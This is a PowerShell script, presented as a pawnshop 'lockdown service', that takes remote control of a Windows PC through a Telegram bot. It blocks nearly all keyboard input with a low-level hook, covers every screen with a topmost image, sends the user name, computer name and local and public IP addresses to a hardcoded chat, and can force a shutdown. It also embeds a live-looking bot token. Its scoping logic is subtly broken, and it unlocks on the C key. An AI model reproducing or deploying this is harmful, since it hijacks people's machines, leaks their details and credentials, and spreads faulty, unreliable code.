# =========================================================
# Pawnshop Lockdown Service v3.0
# • Runs forever  • Controlled by Telegram  • Kiosk Lock
# =========================================================

# ---------- SETTINGS ----------------------------------------------------
$imageURL   = 'https://raw.githubusercontent.com/diezul/x/main/1.png'  # lock‑screen image
$tempImg    = "$env:TEMP\pawnlock.jpg"

$botToken   = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'         # Telegram bot
$chatID     = '656189986'                                              # allowed chat‑id

$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$shutCmd    = "/shutdown$user".ToLower()
# -----------------------------------------------------------------------

# ---------- PREREQUISITES ----------------------------------------------
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing
# -----------------------------------------------------------------------

# ---------- UTILITIES ---------------------------------------------------
function Send-TGMessage([string]$txt) {
    $body = @{ chat_id = $chatID; text = $txt } | ConvertTo-Json -Compress
    try { Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10 } catch {}
}
function Get-IPs {
    try   { $local = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress }
    catch { $local = 'n/a' }
    try   { $pub = Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5 }
    catch { $pub = 'n/a' }
    return "$local | $pub"
}
# -----------------------------------------------------------------------

# ---------- KEYBLOCKER CLASS -------------------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyBlocker {
    private static IntPtr h = IntPtr.Zero;
    private delegate IntPtr LLKproc(int c, IntPtr w, IntPtr l);
    private static LLKproc d = Hook;
    private const int WH = 13, WMK = 0x0100, WMSK = 0x0104;

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, LLKproc cb, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool    UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int c, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);

    public static void Block()  { if(h==IntPtr.Zero) h = SetWindowsHookEx(WH, d, GetModuleHandle(null), 0); }
    public static void Unblock(){ if(h!=IntPtr.Zero){ UnhookWindowsHookEx(h); h = IntPtr.Zero; } }

    private static IntPtr Hook(int n, IntPtr w, IntPtr l) {
        if(n>=0 && (w==(IntPtr)WMK || w==(IntPtr)WMSK)) {
            int vk = Marshal.ReadInt32(l);
            if(vk==0x43) return CallNextHookEx(h,n,w,l); // C allowed
            return (IntPtr)1;                            // everything else blocked
        }
        return CallNextHookEx(h,n,w,l);
    }
}
"@
# -----------------------------------------------------------------------

# ---------- FULLSCREEN FORM --------------------------------------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$lockForm  = $null
function Show-Lock {
    if($lockForm){ return }        # already locked
    [KeyBlocker]::Block()
    $lockForm = @(
        foreach($screen in [Windows.Forms.Screen]::AllScreens){
            $f = New-Object Windows.Forms.Form -Property @{
                FormBorderStyle='None'; WindowState='Maximized'; StartPosition='Manual'; TopMost=$true;
                Location=$screen.Bounds.Location; Size=$screen.Bounds.Size; BackColor='Black'; KeyPreview=$true
            }
            $pb = New-Object Windows.Forms.PictureBox -Property @{
                Image=[Drawing.Image]::FromFile($tempImg); Dock='Fill'; SizeMode='StretchImage'
            }
            $f.Controls.Add($pb)
            $f.Add_Deactivate({ $_.Activate() })  # stay on top
            $f.Add_KeyDown({
                if($_.KeyCode -eq 'C'){ Hide-Lock }
                $_.Handled = $true
            })
            $f.Show()
            $f
        }
    )
    Send-TGMessage "🔒 $pc locked."
}
function Hide-Lock {
    if(!$lockForm){ return }
    foreach($f in $lockForm){ try{ $f.Close() }catch{} }
    $lockForm = $null
    [KeyBlocker]::Unblock()
    Send-TGMessage "🔓 $pc unlocked."
}
# -----------------------------------------------------------------------

# ---------- INITIAL NOTIFICATION ---------------------------------------
Send-TGMessage "✅ Pawnshop service online on $pc (`$user`). IPs: $(Get-IPs)`nCommands:`n  $lockCmd`n  $unlockCmd`n  $shutCmd"
# -----------------------------------------------------------------------

# ---------- TELEGRAM LONG‑POLL LOOP ------------------------------------
$offset = 0
while($true){
    try{
        $upd = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=30&offset=$offset" -TimeoutSec 35
        foreach($u in $upd.result){
            $offset = $u.update_id + 1
            $txt = $u.message.text.ToLower()
            if($u.message.chat.id -ne [int]$chatID){ continue }   # ignore strangers

            switch($txt){
                {$txt -eq $lockCmd}   { Show-Lock }
                {$txt -eq $unlockCmd} { Hide-Lock }
                {$txt -eq $shutCmd}   {
                    Send-TGMessage "⏹ Shutting down $pc now."
                    Stop-Computer -Force
                }
            }
        }
    }catch{ Start-Sleep 5 }  # network error – wait a bit
}
